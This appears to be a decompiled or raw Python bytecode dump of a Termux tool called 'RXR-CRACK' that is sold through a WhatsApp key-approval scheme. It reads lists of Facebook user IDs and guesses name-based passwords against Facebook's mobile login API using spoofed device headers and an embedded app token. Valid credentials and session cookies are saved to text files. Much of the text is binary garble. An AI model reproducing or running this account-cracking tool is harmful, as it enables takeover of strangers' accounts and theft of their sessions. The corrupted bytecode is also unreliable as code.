SELECT: �1�2zpython Extract.py�3z>xdg-open https://facebook.com/groups/rajpoot.x.khan.community/u    [•] Wrong Select �   )r   r   r   �input�methods_menur   r   �menur   �sp)rN  �m_1s     r   r\  z	Main.menu�   s�   � ��(�(�(��&�&�&������ �&�&�&��D�E�E�#��C�Z�Z����������c�z�z��9� �!�!�!��9�9�;�;�;�;�;��S�y�y��9�M�N�N�N�N�N�������a�5�5�5��9�9�;�;�;�;�;r   c                 ��  � t          �   �          t          �   �          t          �   �          t          d�  �         t          �   �          t	          d�  �        }|dk    r0t          �                    d�  �         | �                    �   �          d S |dk    r0t          �                    d�  �         | �                    �   �          d S t          d�  �         t          d�  �         | �	                    �   �          d S )	Nz[1;33m[1] SERVER 1 z)[1;91m [[1;92m*[1;91m][1;92m SELECT: rV  r(   rW  �iiz wrong  rY  )r   r   r   r   rZ  r"   �append�crackingr]  r[  )rN  �m_2s     r   r[  zMain.methods_menu�   s�   � ��(�(�(�6�8�8�8�D�F�F�F��� � � ��&�&�&��E�F�F�#��C�Z�Z�	�=�=������=�=�?�?�?�?�?��c�z�z�	�=�=������=�=�?�?�?�?�?��Z�=�=�=��a�5�5�5��������r   c                 �t  � t          �   �          t          �   �          	 t          d�  �        }t          |�  �        �                    �   �         �                    �   �         }| �                    |�  �         d S # t          $ r6 t          d�  �         t          d�  �         | �                    �   �          Y d S w xY w)Nz-[1;91m[[1;92m*[1;91m][1;92m INPUT PATH : z/[1;91m[[1;92m*[1;91m][1;92m FILE PATH WRONG�   )r   r   rZ  �open�read�splitlines�password_menu�FileNotFoundErrorr   r]  rb  )rN  �file�ids      r   rb  zMain.cracking�   s�   � ��'�'�'��(�(�(���K�L�L�4��T�������$�$�&�&�2����b�������	� � � ��B�C�C�C��a�5�5�5��=�=�?�?�?�?�?�?����s   �AA7 �7<B7�6B7c                 �$  � t          �   �          t          �   �          t          d�  �         	 t          t	          d�  �        �  �        }|dk    rd}n|dk    rd}n	#  d}Y nxY wt          �   �          t          �   �          t          d�  �         t          |�  �        D ]/}t          �                    t	          d|d	z   z  �  �        �  �         �0t          d�  �         t          dt          |�  �        z  �  �         t          d�  �         t          �   �          t          �   �          t          d��  �        5 }|D ]�}|�                    d�  �        \  }}dt          v r#|�                    | j        ||t          �  �         �Fdt          v r#|�                    | j        ||t          �  �         �rdt          v r"|�                    | j        ||t          �  �         ��	 d d d �  �         n# 1 swxY w Y   | �                    t$          t&          �  �         d S )NzL[1;91m [[1;92m*[1;91m][1;92m ENTER PASSWORD LIMIT BETWEEN 1 TO 20 (MAX) z-[1;91m [[1;92m*[1;91m][1;92m PUT LIMIT : r   �   �   r"  zP[1;91m [[1;92m*[1;91m][1;92m EXAMPLE : first123,last1122,firstlast,57273200 z3[1;91m [[1;92m*[1;91m][1;92m PUT PASSWORD %s : rY  u     [•] Cloning Has Been Started u    [•] Total  Ids :  %s u4    [•] [97;1mUse Flight Airplane Mode for speed up �   )�max_workers�|r(   r`  �iii)r   r   r   �intrZ  r   r7   �pwxra  r8   �tpd�splitr"   �submit�method1�method2�method3rT  rR  rS  )	rN  rl  �plimit�limit�n�saqi�user�uid�nms	            r   ri  zMain.password_menu�   s0  � ��'�'�'��(�(�(��^�_�_�_����Q�R�R�S�S�6���l�l��F�F������E�����6�6�6�����'�'�'�&�(�(�(��f�g�g�g���=�=� ^� ^�a��:�:�e�U�WX�YZ�WZ�[�\�\�]�]�]�]��&�'�'�'����B���(�)�)�)��=�>�>�>�u�w�w�w�v�x�x�x��r���� *�d�� *� *�t��Z�Z��_�_�F�C���f�}�}�	�[�[���c�"�S�)�)�)�)�	����	�[�[���c�"�S�)�)�)�)�	�&���	�[�[���c�"�S�)�)�)��*�*� *� *� *� *� *� *� *� *� *� *���� *� *� *� *� ���R������s   �-A �A!�7B!G%�%G)�,G)c                 �4  � 	 t           j        �                    dt          �dt	          t          �  �        �d��  �         t           j        �                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d         }n	#  |}Y nxY w|D �]:}|�                    d|�	                    �   �         �  �        �                    d|�  �        �                    d|�	                    �   �         �  �        �                    d	|�  �        �                    d|�  �        �                    d|�	                    �   �         �  �        }i dt          t          j        �   �         �  �        �dd�dt          t          j        �   �         �  �        �dd�dt          t          j        �   �         �  �        �dd�dd�dd�d|�d|�dd�dd�dd �d!t          t          j        �   �         �  �        �d"d#�d$d%�d&d'�d(d)d*d+d,��}t          �   �         d-d.t          t          j        d/d0�  �        �  �        t          t          j        d/d0�  �        �  �        d1d2d3d4d5d6d7d8d8d9d:�}	t           �                    d;||	d<�=�  �        �                    �   �         }d>|v �r@d?�                    d@� |dA         D �   �         �  �        }t)          j        t-          j        dB�  �        �  �        �                    �   �         �                    dCd �  �        �                    dDdE�  �        �                    dFdG�  �        }dH|� d?|� �}t3          dI|�dJ|�dK��  �         t          �                    |�  �         t7          dLdM�  �        �                    |dNz   |z   dOz   �  �         t7          dPdM�  �        �                    |dNz   |z   dNz   |z   dOz   �  �         t9          |�  �          n��<t          dz  ad S # t:          j        j        $ r | �                     |||�  �         Y d S w xY w)QNz[1;97m[ RXR-CRACK ] [1;33mz [1;97m| [1;92m� r   rY  �first�First�last�Last�Name�name�adid�format�json�	device_id�cpl�true�family_device_id�credentials_type�device_based_login_password�error_detail_type�button_with_disabled�source�device_based_login�email�password�access_tokenz/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�generate_session_cookiesrV  �meta_inf_fbmetar   �advertiser_id�currently_logged_in_userid�0�locale�en_GB�client_country_code�GBzauth.login�authenticatez3com.facebook.account.login.protocol.Fb4aAuthHandler� 882a8490361da98702bf97a021ddc14d)r"   �fb_api_req_friendly_name�fb_api_caller_class�api_keyz!application/x-www-form-urlencodedzgraph.facebook.comi N  i@�  zMOBILE.LTE�FalsezUnid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62�5120�ViewerReactionsMutation�graphservice�Liger�True� d29d67d37eca387482a8a5b740f84f62)zUser-AgentzContent-Type�HostzX-FB-Net-HNIzX-FB-SIM-HNIzX-FB-Connection-TypezX-Tigon-Is-Retryzx-fb-session-idzx-fb-device-groupzX-FB-Friendly-NamezX-FB-Request-Analytics-TagszX-FB-HTTP-EnginezX-FB-Client-IPzX-FB-Server-Clusterzx-fb-connection-tokenz'https://b-graph.facebook.com/auth/loginF)�data�headers�allow_redirects�session_key�;c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS )r�  �=�valueNr   r&   s     r   �	<genexpr>zMain.method1.<locals>.<genexpr>  s3   � � � �L�L�!�Q�v�Y�s�]�1�W�:�-�L�L�L�L�L�Lr   �session_cookies�   r�  �+�_�/�-zsb=u   [1;92m[RXR-OK💉] z | z	 [1;97m z/sdcard/RXR-OK.TXT�arr  r/  z/sdcard/COOKIES.TXT)!�sys�stdout�write�loopr8   rR  �flushrw  r;   �lower�str�uuid�uuid4r9  r%  r&  �sesr!   r�  �join�base64�	b64encoder   �urandomr6  r   ra  rf  rB   r/   �exceptionsr   ry  )rN  r�  r�  ru  �fn�ln�ps�pwr�  r�  �q�coki�sbr   s                 r   ry  zMain.method1�   s�  � �=��:����X\�X\�X\�]`�ac�]d�]d�]d�]d�e�f�f�f�gj�gq�gw�gw�gy�gy�gy�������a��2��	���#���q�	�B�B���	�B�B�B����� 2� 2�r�	���G�B�H�H�J�J�	'�	'�	/�	/���	;�	;�	C�	C�F�2�8�8�:�:�	V�	V�	^�	^�_e�fh�	i�	i�	q�	q�rx�y{�	|�	|�  E�  E�  FL�  MO�  MU�  MU�  MW�  MW�  X�  X�B�/�F�C�����%�%� /� �&�/� �S�������/� �v�/� �C�����%�%�	/� �1�/� �+�/� 	��/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /�D�* (�\�\�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�=� =�G� 	���:��g�gl��m�m�r�r�t�t�A������H�H�L�L�q�9J�7K�L�L�L�L�L�T�RX�Rb�ce�cm�np�cq�cq�Rr�Rr�Ry�Ry�R{�R{�  SD�  SD�  EH�  IK�  SL�  SL�  ST�  ST�  UX�  Y\�  S]�  S]�  Se�  Se�  fi�  jm�  Sn�  Sn�R��B������V��Q�s�s�s�2�2�2�>�?�?�?��Y�Y�s�^�^�^�	��s�#�#�)�)�#�c�'�"�*�T�/�:�:�:�	���$�$�*�*�3�s�7�2�:�c�>�&�+@��+E�F�F�F��V�_�_�_��U����7�4�4�4��	�	�	,� � � ��L�L��R�����������s+   �A6O( �9B �O( �B�MO( �(+P�Pc                 �>   � t          �   �          t          �   �          d S r   )rQ  )rN  r�  r�  ru  s       r   r{  zMain.method3  s   � ��&�&�&��&�&�&�&�&r   N)�__name__�__module__�__qualname__rO  rT  r\  r[  rb  ri  ry  r{  r   r   r   rL  rL  z   s�   � � � � � �� � �� � �� � �&� � � � � �� � �@>� >� >�D	� 	� 	� 	� 	r   rL  s=   x��())(���O�I�M�J-�77�K��O/.�/�K���7202�70�	����e���  ">3z==CRACK-FILE==rn  �&/data/data/com.termux/files/usr/bin/x-�rr?   c                  �z  � t          dd�  �        �                    �   �         } t          j        d�  �         t	          �   �          t          j        t          �  �        j        }| |v rDt          j        d�  �         t	          �   �          t          �   �         �                    �   �          d S t          j        d�  �         t	          �   �          t          d�  �         t          j        d�  �         t	          �   �          t          d�  �         t          d�  �         t          d�  �         t          d�  �         t          dt          z   | z   �  �         t          d�  �         t          d	�  �         t          j        d�  �         dt          z   dz   | z   }t          j        d|z   �  �         t!          �   �          d S )Nr�  r�  r   z<	 [1;31m[[1;32m*[1;31m][1;32m First Get Approvel[1;37m z: [1;31m[[1;32m*[1;31m][1;32m Your Key is Not Approved r   z; [1;31m[[1;32m*[1;31m][1;32m Copy And Send Key To Adminz, [1;31m[[1;32m*[1;31m][1;32m Your Key : z9 [1;31m[[1;32m*[1;31m][1;32m[1;32m Enter To Send Keyg      @zp*ASSALAMUALAIKUM*%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20CRACK-FILE%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20z,am start https://wa.me/+8801952-081184?text=)rf  rg  r   r   r   r/   r1   �Ar%   rL  r\  r   �naimrZ  �timer   �Subscraption)�key1r�  �tkss      r   r�  r�  (  s{  � ��3�S�9�9�>�>�@�@����7����������Q������D�L�L��)�G�����(�(�(��&�&�+�+�-�-�-�-�-��)�G�����(�(�(��V�W�W�W��)�G�����(�(�(��P�Q�Q�Q���)�)�)��Q�R�R�R���*�*�*��	C�D�	H��	M�N�N�N���*�*�*��R�S�S�S��*�S�/�/�/�z�{��  AC�  	C�  DH�  	H�#��)�:�S�@�A�A�A��.�.�.�.�.r   �__main__zgit pullztouch .prox.txt)<r   r�  �rer%  �zlibr�  r   r]  �stringr�  r4  r�  r�  �requests.exceptionsr   �CError�concurrent.futuresr   rv  r/   �ImportErrorr   r0   r�  rl  rR  rS  r�  ru  r"   r   r   r   r   r   �ua3r'  rG  rB   r,  r9  rH  rJ  rL  �decompressr�  r�  r�  �hex�upper�myidrf  rg  r�  �kokr�  �closer�  r�  r\  r   r   r   �<module>r�     s5  �� �	�	�	� ���� 	�	�	�	� � � � � � � � � ���� � � � � � � � � � � � � � � � � � � � � � � � � � � 9� 9� 9� 9� 9� 9� 8� 8� 8� 8� 8� 8�#�������� #� #� #����!�"�"�"�"�"�#���� �h���������������	��� � �w� w� w�� � �� � �$� � �" 	���V�]�B�4����/� /� /�,}� }� }�G� G� G�� � �� � �`	� `	� `	� `	� `	� `	� `	� `	�F �$�/�  t�  u�  u�����T�Z�\�\��b�q�b����!�!�����5�s�;�;�@�@�B�B�����	�T�2�C�8�8�����4��9���������������� � �: �Z����R�Y�z�������������R�Y� �!�!�!�!�������� ����������s6   � A �A�A�:D �:E�!E2 �2E6�9F �F